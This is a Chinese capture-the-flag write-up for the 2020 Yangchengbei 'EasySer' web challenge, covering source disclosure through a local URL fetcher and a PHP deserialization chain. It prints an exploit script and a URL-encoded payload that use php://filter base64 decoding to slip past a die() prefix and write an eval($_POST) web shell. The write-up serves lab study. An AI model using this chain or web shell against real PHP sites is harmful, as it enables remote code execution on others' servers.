# \[羊城杯 2020]EasySer

## \[羊城杯 2020]EasySer

## 考点

* php://filter/write绕过“死亡exit”

## wp

打开链接是Apache2的默认界面，目录扫描存在robots.txt，index.php，flag.php

robots.txt提示访问star1.php

是一个URL访问的功能

![](<../.gitbook/assets/image (8).png>)

提示`用个不安全的协议从我家才能进ser.php`

直接用star1.php访问http://127.0.0.1/ser.php，可以得到源码

{% code title="ser.php" %}
```php
error_reporting(0);
if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {
    highlight_file(__FILE__);
} 
$flag='{Trump_:"fake_news!"}';

class GWHT{
    public $hero;
    public function __construct(){
        $this->hero = new Yasuo;
    }
    public function __toString(){
        if (isset($this->hero)){
            return $this->hero->hasaki();
        }else{
            return "You don't look very happy";
        }}}
class Yongen{ //flag.php
    public $file;
    public $text;
    public function __construct($file='',$text='') {
        $this -> file = $file;
        $this -> text = $text;
        
    }
    public function hasaki(){
        $d   = '<?php die("nononon");?>';
        $a= $d. $this->text;
         @file_put_contents($this->file,$a);
    }}
class Yasuo{
    public function hasaki(){
        return "I'm the best happy windy man";
    }}
```
{% endcode %}

典型的php://filter的妙用，绕过“死亡exit”。`$a`为要写入的shell，`$this->file`为`php://filter/write=convert.base64-decode/resource=shell.php`

`<?php die("nononon");?>`可以被base64识别的有13个字符，shell部分需要补3个字符，即`aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+`

```php
class GWHT{
    public $hero;
}
class Yongen{ // flag.php
    public $file;
    public $text;
    public function __construct($file='',$text='') {
        $this -> file = $file;
        $this -> text = $text;   
    }}
// <?php eval($_POST[1]);?>
$a = new Yongen("php://filter/write=convert.base64-decode/resource=shell.php","aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+");
$b = new GWHT();
$b->hero = $a;
echo urlencode(serialize($b));
```

然后找反序列化接收的参数，Arjun爆破出来两个参数是path和c

payload

`http://c98dc05c-c266-4a0d-ba66-660f7468b652.node4.buuoj.cn:81/star1.php?c=O%3A4%3A%22GWHT%22%3A1%3A%7Bs%3A4%3A%22hero%22%3BO%3A6%3A%22Yongen%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Dshell.php%22%3Bs%3A4%3A%22text%22%3Bs%3A33%3A%22aPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%22%3B%7D%7D&path=http://127.0.0.1/star1.php`

访问shell即可

![](<../.gitbook/assets/image (10).png>)
